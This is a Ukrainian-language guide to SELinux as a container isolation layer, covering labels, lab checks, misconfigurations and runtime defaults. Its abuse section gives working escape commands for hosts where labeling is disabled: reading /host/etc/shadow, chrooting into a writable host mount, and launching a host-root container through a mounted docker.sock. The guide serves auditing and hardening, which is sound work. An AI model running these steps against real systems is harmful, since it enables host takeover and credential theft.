# SELinux

## Огляд

SELinux — **система обов'язкового контролю доступу на основі міток**. Кожний релевантний процес і об'єкт може мати контекст безпеки, а політика визначає, які домени можуть взаємодіяти з якими типами і яким саме чином. У контейнеризованих середовищах це зазвичай означає, що середовище виконання запускає процес контейнера в обмеженому домені контейнера і позначає вміст контейнера відповідними типами. Якщо політика працює правильно, процес може читати й записувати ті ресурси, до яких його мітка має доступ, і буде позбавлений доступу до іншого вмісту хоста, навіть якщо цей вміст стає видимим через mount.

Це один із найпотужніших захистів на боці хоста, доступних у звичних розгортаннях Linux-контейнерів. Він особливо важливий на Fedora, RHEL, CentOS Stream, OpenShift та в інших екосистемах, орієнтованих на SELinux. У таких середовищах рев’ювер, який ігнорує SELinux, часто неправильно зрозуміє, чому очевидний шлях до компрометації хоста фактично заблокований.

## AppArmor проти SELinux

Найпростіша відмінність на високому рівні — AppArmor прив'язаний до шляхів, тоді як SELinux — **орієнтований на мітки**. Це має великі наслідки для безпеки контейнерів. Політика, прив'язана до шляхів, може поводитися інакше, якщо той самий вміст хоста стає видимим під несподіваним шляхом монтування. Політика на основі міток натомість запитує, яка мітка в об'єкта, і що домен процесу може з нею робити. Це не робить SELinux простим, але робить його стійким до класу припущень щодо маніпуляцій зі шляхами, які захисники іноді випадково роблять у системах на базі AppArmor.

Оскільки модель орієнтована на мітки, обробка томів контейнера і рішення щодо змін міток є критично важливими для безпеки. Якщо середовище виконання або оператор змінюють мітки занадто широко, щоб «змусити монтування працювати», межа політики, яка мала обмежувати навантаження, може стати значно слабшою, ніж передбачалося.

## Лабораторія

Щоб перевірити, чи активний SELinux на хості:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб переглянути існуючі мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти звичайний запуск із тим, у якому маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки вона показує різницю між workload, що працює в очікуваному домені контейнера, і тим, з якого було знято цей шар застосування політик.

## Runtime Usage

Podman особливо добре інтегрований з SELinux на системах, де SELinux є частиною стандартної конфігурації платформи. Rootless Podman у поєднанні з SELinux — одна з найміцніших стандартних базових конфігурацій контейнерів, оскільки процес вже не має привілеїв на боці хоста і при цьому обмежується політикою MAC. Docker також може використовувати SELinux там, де це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з маркуванням томів. CRI-O і OpenShift сильно покладаються на SELinux як частину механізму ізоляції контейнерів. Kubernetes також може відкривати налаштування, пов'язані з SELinux, але їхня цінність очевидно залежить від того, чи підтримує і чи застосовує SELinux ОС вузла.

Повторювана наука: SELinux — це не факультативна прикраса. В екосистемах, побудованих навколо нього, він є частиною очікуваної межі безпеки.

## Misconfigurations

Класична помилка — `label=disable`. Операційно це часто відбувається через те, що монтування тому було відхилено, і найшвидшим тимчасовим рішенням стало виключити SELinux із рівняння замість виправлення моделі маркування. Інша поширена помилка — некоректне relabeling вмісту хоста. Широкі операції перетегування можуть змусити застосунок працювати, але також можуть розширити те, до чого контейнер має доступ, значно далі від початкових намірів.

Також важливо не плутати **installed** SELinux з **effective** SELinux. Хост може підтримувати SELinux, але бути в permissive режимі, або runtime може не запускати workload у очікуваному домені. У таких випадках захист значно слабший, ніж може свідчити документація.

## Abuse

Коли SELinux відсутній, у permissive режимі або широко вимкнений для workload, шляхи, змонтовані з хоста, стають набагато легшими для зловживань. Той самий bind mount, який зазвичай обмежувався мітками, може стати прямим шляхом до даних хоста або до їхнього модифікування. Це особливо актуально в поєднанні з записуваними volume mounts, директоріями runtime контейнера або оперативними ярликами, які для зручності відкривали доступ до чутливих шляхів хоста.

SELinux часто пояснює, чому generic breakout writeup працює відразу на одному хості, але постійно зазнає невдач на іншому, хоча runtime flags виглядають схоже. Відсутній інгредієнт часто не пов'язаний з namespace чи capability, а з межею міток, яка залишилася цілою.

Найшвидша практична перевірка — порівняти активний контекст, а потім перевірити змонтовані шляхи хоста або директорії runtime, які зазвичай обмежені мітками:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутній host bind mount і маркування SELinux було відключено або послаблено, зазвичай спочатку відбувається розкриття інформації:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо mount доступний для запису і container фактично є host-root з точки зору kernel, наступний крок — протестувати контрольовану модифікацію хоста, а не гадати:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах з підтримкою SELinux, втрата міток навколо каталогів стану виконання також може відкрити прямі шляхи privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний escape chain, але вони дуже швидко показують, чи саме SELinux перешкоджав доступу до даних хоста або зміні файлів на боці хоста.

### Повний приклад: SELinux вимкнено + записуване монтування хоста

Якщо маркування SELinux вимкнено і файлову систему хоста змонтовано з можливістю запису в `/host`, повний host escape перетворюється на звичайний випадок bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` вдасться, процес контейнера тепер працює в файловій системі хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux Disabled + Runtime Directory

Якщо workload може отримати доступ до runtime socket після відключення labels, то escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Відповідне спостереження полягає в тому, що SELinux часто був тим контролем, який саме запобігав доступу такого типу до host-path або runtime-state.

## Перевірки

Мета перевірок SELinux — підтвердити, що SELinux увімкнено, визначити поточний контекст безпеки та з’ясувати, чи файли або шляхи, що вас цікавлять, фактично обмежені мітками.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Що цікаво тут:

- `getenforce` має ідеально повертати `Enforcing`; `Permissive` або `Disabled` змінюють значення всього розділу SELinux.
- Якщо поточний контекст процесу виглядає несподіваним або занадто широким, робоче навантаження може не виконуватися під передбаченою політикою контейнера.
- Якщо файли, змонтовані з хоста, або runtime-директорії мають мітки, до яких процес має занадто вільний доступ, bind mounts стають набагато небезпечнішими.

Під час перегляду контейнера на платформі з підтримкою SELinux не сприймайте маркування як другорядну деталь. У багатьох випадках це одна з головних причин, чому хост ще не скомпрометований.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Залежить від хоста | Відокремлення SELinux доступне на хостах з увімкненим SELinux, але точна поведінка залежить від конфігурації хоста/демона | `--security-opt label=disable`, широке перетеговування (relabeling) bind mounts, `--privileged` |
| Podman | Зазвичай увімкнено на хостах з SELinux | Відокремлення SELinux є нормальною частиною Podman на системах з SELinux, якщо його не вимкнено | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Зазвичай не призначається автоматично на рівні Pod | Підтримка SELinux існує, але Pod'ам зазвичай потрібні `securityContext.seLinuxOptions` або платформно-специфічні значення за замовчуванням; потрібна підтримка runtime і ноди | слабкі або широкі `seLinuxOptions`, запуск на permissive/disabled нодах, політики платформи, що вимикають маркування |
| CRI-O / OpenShift style deployments | Зазвичай на нього сильно покладаються | SELinux часто є основною частиною моделі ізоляції нод у цих середовищах | кастомні політики, що надмірно розширюють доступ, відключення маркування заради сумісності |

SELinux за замовчуванням більше залежить від дистрибутива, ніж налаштування seccomp. На системах типу Fedora/RHEL/OpenShift SELinux часто є центральним елементом моделі ізоляції. На системах без SELinux його просто немає.
